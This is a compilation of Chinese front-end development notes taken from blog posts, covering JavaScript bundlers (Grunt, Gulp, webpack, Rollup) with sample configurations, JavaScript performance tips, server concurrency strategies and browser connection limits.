很尴尬的是，JavaScript发展很快，但是浏览器跟不上脚本更新的进度。一方面给出了标准，一方面却不能直接在浏览器上使用。

这就出现了 Babel，Babel自称是 JavaScript 编译器，它的作用就是将ES6新语法转成ES5，即现在浏览器可识别的脚本（基本现在是针对老版 IE 内核）。

但是使用 Babel 编译也有缺陷，那就是每一次保存，都需要手动的使用命令行编译，而且编译过程中还需要相关联的包配合使用，很繁琐。所以，打包工具就出现了，它可以帮助做这些繁琐的工作。



2. 打包工具
2.1 介绍
仅介绍 4 款主流的打包工具：grunt ， gulp，webpack， rollup，以发布时间为顺序。

Grunt：最老牌的打包工具，它运用配置的思想来写打包脚本，一切皆配置，所以会出现比较多的配置项，诸如option,src,dest等等。而且不同的插件可能会有自己扩展字段，认知成本高，运用的时候需要明白各种插件的配置规则。
Gulp：用代码方式来写打包脚本，并且代码采用流式的写法，只抽象出了gulp.src, gulp.pipe, gulp.dest, gulp.watch 接口，运用相当简单。更易于学习和使用，使用gulp的代码量能比grunt少一半左右。
webpack: 是模块化管理工具和打包工具。通过 loader 的转换，任何形式的资源都可以视作模块，比如 Commonjs 模块、AMD 模块、ES6 模块、css、图片等。它可以将许多松散的模块按照依赖和规则打包成符合生产环境部署的前端资源。还可以将按需加载的模块进行代码分隔，等到实际需要的时候再异步加载。它定位是模块打包器，而 Gulp/Grunt 属于构建工具。webpack 可以代替 Gulp/Grunt 的一些功能，但不是一个职能的工具，可以配合使用。
Rollup：下一代 ES6 模块化工具，最大的亮点是利用 ES6 模块设计，利用 tree-shaking生成更简洁、更简单的代码。一般而言，对于应用使用 webpack，对于类库使用 Rollup；需要代码拆分(Code Splitting)，或者很多静态资源需要处理，再或者构建的项目需要引入很多 Commonjs 模块的依赖时，使用 webpack。代码库是基于 ES6 模块，而且希望代码能够被其他人直接使用，使用 Rollup。


2.2 使用总结
point_right Grunt：MPA，老牌打包工具，基于文件为媒介（运行慢，零散的脚本文件一当多起来就受到影响

point_right Gulp：MPA，易学，基于 nodejs 的 steam 流打包
point_right webpack：SPA，目前最强大的打包工具，但是过于臃肿，如何单纯打包js不推荐

point_right Roleup：MPA，tree-shaking特性（针对es6，按需打包，多余的不要，目前（2018，vuex,react主流使用）



2.3 如何选择
如果你一个都不熟悉的话，那么我直接推荐 webpack，官方文档非常详细，更新频率很高。而且在其他的打包工具在处理非网页文件（比如svg, png, vue等）基本还是需要借助它来实现。最关键现在的脚手架主流依旧是它。

如果在处理文件需要关注前端三剑客的话，那么 grunt 和 gulp 会更好点，这两者我直接推荐 gulp，除非你已经很熟悉 grunt了。

如果你更加在意脚本代码的简洁精炼，那么可以使用rollup

如果你还要更加精炼一点，这里新出来一个新的打包工具，免插件式parcel



3. 个人打包配置
在打包上，我个人注重的是配置从简单到复杂，所以我分开使用。

css 打包选择了gulp，2个任务，3个插件，有一个插件是为了编译scss，如果直接使用css，那么这个插件也可以去除。

// 任务一：编译
gulp.task('compile', function () {
  return gulp.src('src/scss/*.scss')
    .pipe(sass({outputStyle: 'expanded'})) // 插件一：编译scss
    .on('error', showError)
    .pipe(autoprefixer({ // 插件二：自动添加浏览器前缀
      browsers: ['> 1%', 'last 4 versions'],
      cascade: false,
      remove: true
    }))
    .pipe(cleanCss({ // 插件三：压缩样式
      compatibility: 'ie8',
      format: 'keep-breaks'
    }))
    .pipe(gulp.dest('../dist/css'));
})
// 任务二：观察
gulp.task('watch', function(){
  gulp.watch('src/scss/*.scss', ['compile'])
})
ECMAScript 个人现在基本使用es6，所以在打包脚本上我选择了rollup，只提取有用的代码，配置上参考react官方配置文档

import resolve from 'rollup-plugin-node-resolve';
import babel from 'rollup-plugin-babel';
import commonjs from 'rollup-plugin-commonjs';
import { eslint } from 'rollup-plugin-eslint';
import { uglify } from 'rollup-plugin-uglify';

const env = process.env.NODE_ENV;
console.log('当前环境：%s', env);

const configs = [
  {
    input: 'src/js/index.js',
    output: {
      file: 'dist/js/index.js',
      format: 'umd',
      name: 'atom',
      banner,
      sourcemap: true
    }
  }
]

const plugins = [
  eslint({ // 检测js代码语法格式
    formatter: 'codeframe',
    include: [
      'src/js/**/*.js'
    ]
  }),
  resolve({ // 提取所依赖的代码
    jsnext: true,
    main: true,
    browser: true,
    module: true
  }),
  babel({ // 编译es6 -> es5
    exclude: 'node_modules/**' // 只编译我们的源代码
  }),
  commonjs() // 将commonjs 转成 es6 
]

export default configs.map(v => {
  v.plugins = plugins

  if (env === 'development') {
    v.watch = { // 监听脚本的变化
      include: 'src/js/**',
      exclude: ['node_modules/**']
    }
  }

  if (env === 'production') {
    v.plugins.push(
      uglify({ // 压缩脚本
        compress: {
          pure_getters: true,
          unsafe: true,
          unsafe_comps: true,
          warnings: false
        }
      })
    )
  }

  return v
});
html 个人不做任何处理，可以在上线压缩减少文件的体积，压缩直接使用gulp

html/*.html') .pipe(htmlmin(options)) // 使用gulp-htmlmin插件 .pipe(gulp.dest('dist/html')); });" title="" data-original-title="复制">
// 任务一
gulp.task('testhtmlmin', function () {
    var options = {
        removeComments: true,//清除HTML注释
        collapseWhitespace: true,//压缩HTML
        collapseBooleanAttributes: true,//省略布尔属性的值 <input checked="true"/> ==> <input />
        removeEmptyAttributes: true,//删除所有空格作属性值 <input id="" /> ==> <input />
        removeScriptTypeAttributes: true,//删除<script>的type="text/javascript"
        removeStyleLinkTypeAttributes: true,//删除<style>和<link>的type="text/css"
        minifyJS: true,//压缩页面JS
        minifyCSS: true//压缩页面CSS
    };
    gulp.src('src/html/*.html')
        .pipe(htmlmin(options)) // 使用gulp-htmlmin插件
        .pipe(gulp.dest('dist/html'));
});


来自：https://segmentfault.com/a/1190000019434666
```

### 构建工具
```
https://www.cnblogs.com/lihuijuan/p/9296315.html
全局安装是把包安装在Node安装目录下的node_modules文件夹中，一般在 \Users\用户名\AppData\Roaming\ 目录下，可以使用npm root -g查看全局安装目录

本地（局部）安装是把包安装在指定项目（要在指定的根目录下输入命令）的node_modules文件夹下（若没有，会自动创建一个node_modules文件夹）

具体区别，推荐博文：  全局安装和本地（局部）安装的区别

 本地安装可以让每个项目拥有独立的包，不受全局包的影响，方便项目的移动、复制、打包等，保证不同版本包之间的相互依赖，

一、理解
1、什么是项目构建？
编译项目中的 js、sass、less
合并js/css等文件(使用构建工具合并后，会自动生成合并后文件，这样只需引入合并文件即可，减少资源加载的次数)
压缩js/css/html等资源文件（减小文件的大小，减小内存占用）
js语法的检查
项目构建可以减少项目的重量，

2、构建工具的作用？
简化项目构建，自动化完成构建

二、构建工具
主要有三种：Grunt、Gulp、Webpack

1、Grunt（中文网）
（1）介绍：
是一套前端自动化构建工具，一个基于nodeJs的命令行工具，它是一个任务运行器, 配合其丰富强大的插件

执行任务时是同步的，要注意任务的顺序

（2）常用功能：
合并文件(js/css)
压缩文件(js/css)
语法检查(js)
less/sass预编译处理
其它
（3）安装步骤
安装grunt
全局安装 grunt-cli：npm install -g grunt-cli

局部安装grunt：npm install grunt --save-dev 

配置文件: Gruntfile.js：
此配置文件本质就是一个node函数类型模块
配置编码包含3步:

1. 初始化插件配置 2. 加载插件任务

3. 注册构建任务基本编码:

构建命令
使用插件
复制代码
module.exports = function(grunt){
// 1. 初始化插件配置
grunt.initConfig({
//主要编码处
});
// 2. 加载插件任务
// grunt.loadNpmTasks('grunt-contrib-concat');
// 3. 注册构建任务
grunt.registerTask('default', []);
};
复制代码
（4）Grunt常用插件：
grunt-contrib-clean——清除文件(打包处理生成的)
grunt-contrib-concat——合并多个文件的代码到一个文件中
grunt-contrib-uglify——压缩js文件
grunt-contrib-jshint——javascript语法错误检查；
grunt-contrib-cssmin——压缩/合并css文件
grunt-contrib-htmlmin——压缩html文件
grunt-contrib-imagemin——压缩图片文件(无损)
grunt-contrib-copy——复制文件、文件夹
grunt-contrib-requirejs——合并压缩requirejs管理的所有js模块文件
grunt-contrib-watch——实时监控文件变化、调用相应的任务重新执行
2、Gulp（中文网）
gulp是与grunt功能类似的前端项目构建工具, 也是基于Nodejs的自动任务运行器
能自动化地完成 javascript/coffee/sass/less/html/image/css 等文件的合并、压缩、检查、监听文件变化、浏览器自动刷新、测试等任务
gulp更高效(异步多任务), 更易于使用, 插件高质量

（1）特点：
任务化
基于流（gulp有一个自己的内存，通过指定API将源文件流到内存中，完成相应的操作后再通过相应的API流出去）
执行任务可以同步可以异步
gulpfile.js-----gulp配置文件 任务执行时，会首先执行该文件

（2）重要API：
gulp.src(filePath/pathArr) : 指向指定路径的所有文件,找到目标源文件，将数据读取到gulp的内存中
gulp.dest(dirPath/pathArr)：指向指定的所有文件夹，将文件输出到指定的文件夹中
gulp.task(name, [deps], fn) ：定义一个任务
gulp.watch() ：监视文件的变化
 

（3）安装步骤 （全局安装gulp是为了执行gulp任务，本地安装gulp则是为了调用gulp插件的功能）
安装gulp:
全局安装gulp：npm install gulp -g
局部安装gulp：npm install gulp --save-dev
配置编码: gulpfile.js
　　　　//引入gulp模块
　　　　var gulp = require('gulp');
　　　　//注册任务
　　　　gulp.task('任务名', function() {
　　　　　　// 任务的操作
　　　　});

　　　　//注册默认任务
　　　　gulp.task('default', ['任务名'])

构建命令:
在终端  根目录下  输入：
gulp   会执行gulpfile.js文件中所有的任务
　　　gulp 任务名   会执行gulpfile.js文件中指定的任务  

使用gulp插件
（4）相关插件 
gulp-concat : 合并文件(js/css)
gulp-uglify : 压缩js文件
gulp-rename : 文件重命名
gulp-less : 编译less 转化less语法为css
gulp-clean-css : 压缩css文件
gulp-livereload : 实时自动编译刷新
下载插件（可一次下载安装多个，安装在项目根目录下）：

npm install gulp-concat gulp-uglify gulp-rename --save-dev

npm install gulp-less gulp-clean-css --save-dev 

（5）举例：下面是一个gulpfile.js文件
复制代码
var gulp = require('gulp');//引入的gulp是一个对象
//引入的插件  均为方法
var concat = require('gulp-concat');
var uglify = require('gulp-uglify');
var rename = require('gulp-rename');
var less = require('gulp-less');
var cssClean = require('gulp-clean-css');

//注册任务(基本语法)
// gulp.task('任务名',function(){
//     //任务的操作
//
// })

//注册 合并压缩js的任务
gulp.task('js',function(){
    return gulp.src('src/js/*.js') //找到目标源文件，将数据读取到gulp的内存中  *代表全部文件
        .pipe(concat('build.js')) //参数为 合并后 js文件的名字
        .pipe(gulp.dest('dist/js/')) //参数为 输出文件到的文件夹  只要还没有操作完说明当前的文件还在内存中
        .pipe(uglify()) //压缩文件
        .pipe(rename({suffix:".min"}))//重命名
        .pipe(gulp.dest('dist/js/'));
});
//注册 转换less为css的任务
gulp.task('less',function(){
    //带上return 为异步 ；不带return 为同步；异步速度快，因为任务可以同时加载，建议用异步
    return gulp.src('src/less/*.less')
        .pipe(less()) //编译less文件为css文件
        .pipe(gulp.dest('src/css/'))
});

//注册 合并压缩css文件的任务
gulp.task('css',['less'],function(){ //['less'] 表示 css任务的执行依赖于less任务，只有当less任务全部执行后，才会开启css任务
    return gulp.src('src/css/*.css') //找到文件
        .pipe(concat('build.css')) //合并文件
        .pipe(cssClean()) //压缩文件
        .pipe(rename({suffix: '.min'})) //重命名
        .pipe(gulp.dest('dist/css/')); //输出文件
});
//注册 默认任务
gulp.task('default',['js','less','css']);
复制代码
终端处 在项目根目录下 输入：

gulp js  会自动执行该 js 任务
gulp css 会自动执行 该 css 任务
gulp less 会自动执行该less 任务
gulp 会自动执行所有任务
 目录结构大致如下：

 
最后还有一个自动编译插件（即源码发生改变时，原先经过处理的文件会自动更新，不用再重新gulp构建一遍）

 自动编译

复制代码
下载插件：
npm install gulp-livereload --save-dev

配置编码:：
var livereload = require('gulp-livereload');

//所有的任务后边 都要加上一个“管道”，来保持更新：
.pipe(livereload());

//注册 监测任务
gulp.task('watch', ['default'], function () { 
//开启监视：
livereload.listen();
//监视指定的文件, 并指定对应的处理任务

gulp.watch('src/js/*.js',['js']);
gulp.watch(['src/css/*.css','src/less/*.less'],['css'])

});
复制代码
这样，当文件发生改变时，不用再重新gulp，编译的文件会自动发生改变

3、Webpack（中文网）
（1）说明：
Webpack是前端资源模块化管理和打包工具，一个模块打包器(bundler)。
在Webpack看来, 前端的所有资源文件(js/json/css/img/less/...)都会作为模块处理
它将根据模块的依赖关系进行静态分析，生成对应的静态资源

Webpack的工作方式是：把你的项目当做一个整体，通过一个给定的主文件（如：index.js），Webpack将从这个文件开始找到你的项目的所有依赖文件，使用loaders处理它们，最后打包为一个（或多个）浏览器可识别的JavaScript文件。

与gulp和grunt相比，Webpack的处理速度更快更直接，能打包更多不同类型的文件，更主要的区别还是 webpack是一个模块化打包工具。

（2）四个核心概念：
入口(entry)：指示 webpack 应该使用哪个模块，来作为构建其内部依赖图的开始。进入入口起点后，webpack 会找出有哪些模块和库是入口起点（直接和间接）依赖的。
输出(output)：告诉 webpack 在哪里输出它所创建的 bundles，以及如何命名这些文件，默认值为 ./dist。基本上，整个应用程序结构，都会被编译到你指定的输出路径的文件夹中。
loader：让 webpack 能够去处理那些非 JavaScript 文件（webpack 自身只理解 JavaScript）。loader 可以将所有类型的文件转换为 webpack 能够处理的有效模块，然后你就可以利用 webpack 的打包能力，对它们进行处理
插件(plugins)：使用时，require() 引入，然后把它添加到 plugins 数组中
（3）安装
全局安装：

npm install webpack webpack-cli --g
局部安装（本地安装）：

npm install webpack webpack-cli --save-dev
（4）举例：下面是一个 webpack.config.js文件
复制代码
const path = require('path');//path是内置的模块，用来设置路径
const HtmlWebpackPlugin = require('html-webpack-plugin'); //自动生成html文件的插件
const CleanWebpackPlugin = require('clean-webpack-plugin'); //清除之前打包的文件

module.exports = {
    entry: './src/js/entry.js', // 入口文件
    output: { // 输出配置
        filename: 'bundle.js', // 输出文件名
        path: path.resolve(__dirname, 'dist/js')  //输出文件路径配置  __dirname代表根目录
    },
    module: {
        rules: [ //样式 loader
            {
                test: /\.css$/,
                use: [
                    'style-loader',
                    'css-loader'
                ]
            },
            { //图片 loader
                test: /\.(png|jpg|gif)$/,
                use: [
                    {
                        loader: 'url-loader',
                        options: {
                            limit: 8192
                        }
                    }
                ]
            }
        ]
    },
    devServer: {//热部署
        contentBase: 'dist/js/' //若为空 webpack-dev-server默认服务于根目录下的index.html
    },
    plugins: [ //插件列表
        new HtmlWebpackPlugin({template: './index.html'}),
        new CleanWebpackPlugin(['dist']),
    ]
};
```

### vue、react、webpack、
```

```

### 前端 mvc 
```
https://www.zhihu.com/question/267581572
https://segmentfault.com/a/1190000009127861
```

### 优化
```
https://www.cnblogs.com/tianshu/p/10555921.html
首先，性能优化分好几个方面，本章我们从js方面来优化。

 

 

1：垃圾收集

 

日常中的某些情况下垃圾收集器无法回收无用变量，导致的一个结果就是——内存使用率不断增高，以下为对应的情况以及处理方法。

 

①对象相互引用会导致引用计数始终为2，所以用完对象后应将引用设为null，例子如下

复制代码
let element = document.getElementById("test");
let myObject = new Object();
myObject.element = element;
element.someObject = myObject;

//....用完后需要加如下代码
myObject.element = null;
element.someObject = null;
复制代码
 

②当数据不再有用时，需要通过将值设为null来解除引用，该做法适用于大多数全局变量和全局对象属性，例子如下

复制代码
function createPerson(name){
    let localPerson = new Object();
    localPerson.name = name;
    return localPerson
}

let globalPerson = createPerson("test")

//...用完后手动解除
globalPerson = null
复制代码
 

③关于与闭包相关的内存泄漏如下

复制代码
function assignHandler(){
  let element = document.getElementById("test");
  element.onclick = function(){
    alert(element.id)    
  }          
}

//以上会导致element的引用数无法被回收，更改如下
function assignHandler(){
  let element = document.getElementById("test");
  let id = element.id;
  
  element.onclick = function(){
    alert(id)
  }          
  element = null;  
}
复制代码
 

 

2:事件委托

 

在js中，添加到页面上的事件处理程序数量会直接关系到页面整体运行运行性能。导致这一问题的原因是多方面的。首先函数都是对象，都会占用内存；内存中对象越多，性能就越差。其次，必须事先指定所有事件处理程序而导致的DOM访问次数，会延迟整个页面的交互就绪时间。以下为对应的情况以及处理方法

 

①同类型的事件处理函数过多时，应该结合为一个，例子如下：

复制代码
//html代码
<ul id="myLinks">
    <li id="goSomeWhere">Go somewhere</li>
    <li id="sayHi">Say hi</hi>
</ul>


//分别加上事件处理-JS代码
let item1 = document.getElementById("goSomeWhere");
let item2 = document.getElementById("sayHi");

EventUtil.addHandler(item1, "click", function(event){
  console.log("goSomeWhere")  
}

EventUtil.addHandler(item2, "click", function(event){
  console.log("sayHi");  
}

//改善点即将click事件结合在一起
let list = document.getElementById("myLinks")

EventUtil.addHandler(list, "click", function(event){
  event = EventUtil.getEvent(event);
  let target = EventUtil.getTarget(event);
  
  switch(target.id){
    case "goSomeWhere":
      console.log("goSomeWhere");
      break;
   case "sayHi":
      console.log("sayHi");    
      break;            
  }     
}
复制代码
 

②内存留有过时不用的“空事件处理程序”也是造成性能问题的主因，两种情况下会造成该问题。运用removeChild()和replaceChild()方法去除节点时；在使用innerHTML替换页面某一部分时，如果带有事件处理程序的元素被innerHTML删除了，那么原有事件处理函数极有可能无法被回收，例子如下

复制代码
//例子中id为myBtn的点击事件变为了空事件处理程序
<div id="myDiv">
    <input type="button" value="Click Me" id="myBtn">
</div>
<script type="text/javascript">
    let btn = document.getElementById("myBtn");
    btn.onclick = function(){
      document.getElementById("myDiv").innerHTML = "xxxx";  
    };
</script>

//改善点即需要手工移除事件处理程序
<div id="myDiv">
    <input type="button" value="Click Me" id="myBtn">
</div>
<script type="text/javascript">
    let btn = document.getElementById("myBtn");
    btn.onclick = function(){
      btn.onclick = null;
      document.getElementById("myDiv").innerHTML = "xxxx";  
    };
</script>
复制代码
 

 

3：注意作用域

 

关于作用域链，我们明白访问全局变量会比访问局部变量要慢

 

①若某处循环使用全局变量时，我们可以略做修改，例子如下

复制代码
//假设有多个img标签的内容，循环中引用了多次document全局变量
function updateUI(){
  let imgs = document.getElementsByTagName("img")
  for (let i = 0; len = imgs.length; i < len; ++i){
    imgs[i].title = document.title + " image “ + i  
  }    

  let msg = document.getElementById("msg");
  msg.innerHTML = "Update";    
}

//改善点
function updateUI(){
  let doc = document
  let imgs = doc.getElementsByTagName("img")
  for (let i = 0; len = imgs.length; i < len; ++i){
    imgs[i].title = doc.title + " image “ + i  
  }    

  let msg = doc.getElementById("msg");
  msg.innerHTML = "Update";    
}
复制代码
 

②尽量少用with，因为with会增加其中执行代码的作用域链的长度

 

 

4：选择正确方法

 

首先，我们要了解JS中算法的复杂度

标记名称	 	描述
O(1)	常数	不管有多少值，执行的时间都是恒定的。一般表示简单值和存储在变量中的值
O(log n)	对数	总的执行时间和值的数量相关，但是要完成算法并不一定要获取每个值。例如：二分查询
O(n)　	线性	总执行时间和值的数量直接相关。例如：遍历某个数组中的所有元素
O(n^2)	平方	总执行时间和值的数量有关，每个值至少要获取n次。例如：插入排序
 

 

 

 

常数值和访问数组元素操作都是O(1)操作；对象属性查找操作是O(n)操作；

如let values =  [5, 10]; let sum = values[0] + values[1]属于O(1)操作；let values = window.location.href属于O(2)操作

 

①遇到有多次属性查询的场合，可以考虑是否能做优化，例子如下

复制代码
//这里总共做了6次属性查询，其中window.location.href.substring与window.location.href.indexOf分别为3次
let query = window.location.href.subsring(window.location.href.indexOf("?"))


//改善, 第一次访问时复杂度会是O(n),但该版本只有4次属性查询，相对于原始版本节省了33%
let url = window.location.href;
let query = url.substring(url.indexOf("?"));
复制代码
 

②循环优化，这里其实用后测试循环代替前测试循环会更好，不过本地不采用，例子如下

复制代码
//原有复杂度为O(n)
for (let i = 0; i < values.length; ++i){
  process(values[i]);  
}

//更改后复杂度为O(1)
for (let i = values.length - 1; i >= 0; --i){
  process(values[i])  
}
复制代码
 

③最小化语句数相关

 

例如进行多个声明时，我们可以进行组合，例子如下

复制代码
//多个声明
let count = 5；
let color = "blue";
let values = [1, 2, 3];

//组合成一个
let count = 5，
     color = ”blue",
     values = [1, 2, 3]
复制代码
 

例如插入迭代值时，例子如下

复制代码
//修改前
let name = values[i];
i++;

//修改后
let name = values[i++]
复制代码
 

使用数组和对象字面量时，例子如下

复制代码
//修改前
let values = new Array();
values[0] = 123;
values[1] = 456;
values[2] = 789;

let person = new Object();
person.name = "Eric";
person.age = 20;

//修改后
let values = [123, 456, 789]
let person = {
  name: "Eric",
  age:20,    
}
复制代码
 

④创建DOM节点最好使用innerHTML方法，因为innerHTML设置值时，后台会创建HTML解析器，然后使用内部的DOM调用来创建DOM结构，而非基于JS的DOM调用。

调用一次innerHTML，就会进行一次现场刷新，循环插入DOM结构时，应注意尽量调用少次数的innerHTML，代码如下

复制代码
//错误方法，做了很多次现场刷新
let list = document.getElementById("myList"),
    i;

for (i = 0; i < 10; ++i){
  list.innerHTML = html+= "<li>Item " + i + "</li>"  
}


//正确方法，尽管在字符串连接上有性能损失，但却只做了一次现场刷新
let list = document.getElementById("myList"),
    html = "",
    i;

for (i = 0; i < 10; ++i){
  html += "<li>Item " + i + "</li>"  
}

list.innerHTML = html
复制代码
 

⑤其他如有多个if-else语句时，应尽可能转为Switch语句；用appendChild()插入元素时，应采用自上而下插入；面向对象编程时，应合理释放内存，设object为null。
```

### 如何处理负载、高并发
```
从低成本、高性能和高扩张性的角度来说有如下处理方案：
1. HTML静态化
其实大家都知道，效率最高、消耗最小的就是纯静态化的html页面，
所以我们尽可能使我们的 网站上的页面采用静态页面来实现，这个最简单的方法其实也是最有效的方法。
2. 图片服务器分离
把图片单独存储，尽量减少图片等大流量的开销，可以放在一些相关的平台上，如骑牛等
3. 数据库集群和库表散列及缓存
数据库的并发连接为100，一台数据库远远不够，可以从读写分离、主从复制，数据库集群方面来着手。
另外尽量减少数据库的访问，可以使用缓存数据库如memcache、redis。
4. 镜像：
尽量减少下载，可以把不同的请求分发到多个镜像端。
5. 负载均衡：
Apache的最大并发连接为1500，只能增加服务器，可以从硬件上着手，如F5服务器。
当然硬件的成本比较高，我们往往从软件方面着手。
###*负载均衡**建立在现有网络结构之上，
它提供了一种廉价有效透明的方法扩展网络设备和服务器的带宽、增加吞吐量、加强网络数据处理能力，
同时能够提高网络的灵活性和可用性。目前使用最为广泛的负载均衡软件是Nginx、LVS、HAProxy。
- 知识点： [反向代理
https://www.cnblogs.com/Anker/p/6056540.html
```

### 浏览器单域名并发数限制
```
https://www.cnblogs.com/sunsky303/p/8862128.html
当我们在浏览网页的时候，对浏览速度有一个重要的影响因素，就是浏览器的并发数量。并发数量简单通俗的讲就是，当浏览器网页的时候同时工作的进行数量。

 

如果同时只有2个并发连接数数量，那网页打开的时候只能依赖于这2条线程，前面如果有打开慢的内容，就会直接影响到后面的内容打开。但是如果同时有更多的并发连接数，这样就会大大的提高网页加载速度。详情可查看我们之前发布的文章：并发连接数对浏览器加载速度的测试。浏览器的并发连接数也并非越大越好。

 

下表概括了基于主机上运行的IE浏览器的版本的最大并发连接数、主机的连接速度和服务器的受支持的协议版本。

  

1，HTTP客户端一般对同一个服务器的并发连接个数都是有限制的。

实际上，浏览器确实使用并行连接，但它们将并行连接的总数限制为少量（通常为四个）。服务器可以自由地关闭来自特定客户端的过多连接。

2，一些主流浏览器对HTTP 1.1和HTTP 1.0的最大并发连接数目，可以参考如下表格：

浏览器

HTTP / 1.1

HTTP / 1.0

IE 11

6

6

IE 10

6

6

IE 9

10

10

IE 8

6

6

IE 6,7

2

4

火狐

6

6

Safari 3,4

4

4

Chrome 4+

6

6

歌剧9.63,10.00alpha

4

4

Opera 10.51+

8

？

 	 	 
iPhone 2

4

？

iPhone 3

6

？

iPhone 4

4

？

iphone 5

6

？

 	 	 
Android2-4

4

？

 

3，Firefox 浏览器的最大并发连接数

在Firefox中的地址栏输入“about：config中”，然后搜索并修改如下两个配置项目即可：

network.http.max持久的连接 - 每个服务器

network.http.max持久的连接 - 每个代理

网络。HTTP。最大的连接：设置的Http同时连接的最大数量

network.http.max持久的连接，每台服务器是连接同一个服务器允许的最大持久连接数，默认为6，可以不用更改。

network.http.max持久的连接 - 每个代理每个代理服务器允许的最大持久连接数

公司用户使用代理服务器，但是外面的客户一般不使用代理，火狐的维基推荐的network.http.max持久的连接，每台服务器设置为：<= 10。

4，IE 浏览器的最大并发连接数

用“注册表编辑器”命令打开注册表编辑器，找到：

[HKEY_CURRRENT_USER \ Software \ Microsoft \ Windows \ CurrentVersion \ Internet Settings]，可以看到MaxConnectionsPerServer和MaxConnectionsPer1_0Server

这两个键（分别是针对HTTP 1.1和HTTP 1.0的设置）

对于IE 9

[HKEY_CURRRENT_USER \ Software \ Policies \ Microsoft \ Internet Exploer \ Main \ FeatureControl，可以看到FEATURE_MAXCONNECTIONSPER1_0SERVER和FEATURE_MAXCONNECTIONSPERSERVER

这两个键（分别是针对HTTP 1.1和HTTP 1.0的设置）

************************************************** **************************

5，假定一个浏览器的并发连接请求数为10，通常同一时间内会有多个用户并发访问网站。又考虑到，一个Http连接请求在同一时间只能被一个线程访问。

所以，IHS服务器的httpd.conf里的maxclients（允许建立的总线程数）要能够处理峰值时刻的浏览器连接请求才行。

同时，考虑不是所有的连接请求都会到was server，有的连接只是为了在web服务器上取静态资源，所以，was上的线程池数目（Thread pools ：50 ）会远小于IHS server上的maxclients值譬如400）。

************************************************** *****************************

6，HTTP 连接请求与线程

HTTP连接是复杂，有状态的对象，所以它必须被妥善管理。一个HTTP 连接请求在同一时间只能被一个线程访问。

HttpClient的使用一个叫做的Http连接管理器的特殊实体类来管理的Http连接.Http连接管理器在新建的HTTP连接时，作为工厂类;管理持久的http连接的生命周期;同步持久连接（确保线程安全，即一个HTTP连接同一时间只能被一个线程访问）。

如果一个的Http连接被释放或者被它的消费者明确表示要关闭，那么底层的连接就会和它的代理进行分离，并且该连接会被交还给连接管理器。这是，即使服务消费者仍然持有代理的引用，它也不能再执行I / O操作，或者更改的Http连接的状态。

如图7所示，连接池管理器

连接池管理器是个复杂的类，它管理着连接池，可以同时为很多线程提供HTTP连接请求。当请求一个新的连接时，如果连接池有有可用的持久连接，连接管理器就会使用其中的一个，而不是再创建一个新的连接。

当使用了请求连接池管理器后，HttpClient的就可以同时执行多个线程的请求了。

连接池管理器会根据它的配置来分配请求连接。如果连接池中的所有连接都被占用了，那么后续的请求就会被阻塞，直到有连接被释放回连接池中。

8，线程池的原理：

线程池的原理很简单，类似于操作系统中的缓冲区的概念，它的流程如下：

线程池在还没有任务到来之前，创建一定数量的线程，放入空闲队列中。这些线程都是处于睡眠状态，即均为启动，不消耗CPU，而只是占用较小的内存空间。当客户端有一个新请求时，就会唤醒线程池中的某一个睡眠线程，让它来处理客户端的这个请求，当处理完这个请求后，线程又处于睡眠状态。

线程池能节约大量的的系统资源，使得更多的CPU时间和内存用来处理实际的商业应用，而不是频繁的线程创建与销毁

每个线程需要大约1MB内存，线程开的越多，消耗的内存也就越大。

在什么情况下使用线程池：
1.单个任务处理的时间比较短
2.将需处理的任务的数量大

9，数据库连接池：

数据库连接池的解决方案是在应用程序启动时建立足够的数据库连接，并讲这些连接组成一个连接池（简单说：在一个“池”里放了好多半成品的数据库联接对象），由应用程序动态地对池中的连接进行申请，使用和释放。对于多于连接池中连接数的并发请求，应该在请求队列中排队等待。并且应用程序可以根据池中连接的使用率，动态增加或减少池中的连接数。 
连接池技术尽可能多地重用了消耗内存地资源，大大节省了内存，提高了服务器地服务效率，能够支持更多的客户服务。通过使用连接池，将大大提高程序运行效率，同时，我们可以通过其自身的管理机制来监视数据库连接的数量，使用情况等。

1）最小连接数是连接池一直保持的数据库连接，所以如果应用程序对数据库连接的使用量不大，将会有大量的数据库连接资源被浪费; 
2）最大连接数是连接池能申请的最大连接数，如果数据库连接请求超过此数，后面的数据库连接请求将被加入到等待队列中，这会影响之后的数据库操作。

数据库连接是一种关键的有限的昂贵的资源，这一点在多用户的网页应用程序中体现得尤为突出。一个数据库连接对象均对应一个物理数据库连接，每次操作都打开一个物理连接，使用完都关闭连接，这样造成系统的性能低下。

10，WebSphere Application Server性能

http://websphere.sys-con.com/node/46514/print

构建服务器应用程序的一个过于简单的模型是：每当一个请求到达就创建一个新的服务对象，然后在新的服务对象中为请求服务但当有大量请求并发访问时，服务器不断的创建和销毁对象的开销很大。

在面向对象的编程中，创建和销毁对象是很浪费资源的，因为创建一个对象要获取内存资源或者其它更多资源。在Java的中更是如此，虚拟机试图跟踪每一个对象，以便能够在对象销毁后进行垃圾回收。所以，提高程序效率的一个手段就是尽可能减少创建和销毁对象的次数。利用已有的对象来服务就是“池化资源”技术产生的原因。

图1显示了一个需要后端处理的应用程序请求流程，并说明了在处理用户请求时线程池之间的关系。 

HTTP侦听器
HTTP侦听器负责在HTTP服务器级别创建线程。这里发生的大多数处理是静态页面服务，或HTTP post / GET传递命令到后端。这是必须考虑的第一级线程配置。

Web容器
Web容器负责在应用程序服务器级别创建线程池。此级别的大多数处理包括servlet，JSP，EJB，动态页面创建和后端传递处理。Web容器是必须配置的第二级线程池配置。

ORB容器 ORB容器负责在对象级创建线程池。这里发生的大部分处理包括处理基于非Web的客户端。ORB容器是必须配置的线程池配置的第三级。

数据源
数据源级负责创建从数据库或“传统”系统访问的连接线程。这些线程是必须解决的第四级配置

 

连接数的小故事

 

实际情况（china）：

 

连接数的真相

 

很多客户端软件可以修改电脑的最大连接数，比如：迅雷、暴风影音等。

 

之前我们曾跟大家分享过如何修改IE浏览器的并发连接数，如果你正在使用IE7及以下的更低版本，不妨尝试将连接数修改到6，这将有助于提升打开网站的速度。

 

举个例子：


 

IE8
 
和IE6完全不同的瀑布图，其特点有：

最大并发HTTP连接数为6个。
javascript文件已经不会阻塞其他资源的加载，甚至多个javascript文件可以一起加载，并且会保证执行的顺序。
会分析HTML结构，优先下载script和link标签定义的外部资源。
Firefox3.6
 
和IE8的几乎完全一样：

最大并发HTTP连接数为6个（可在about:config中修改）。
javascript文件不会阻塞其他资源的加载，多个javascript文件可以一起加载。
会分析HTML结构，优先下载script和link标签定义的外部资源。
Firefox4 beta12
 
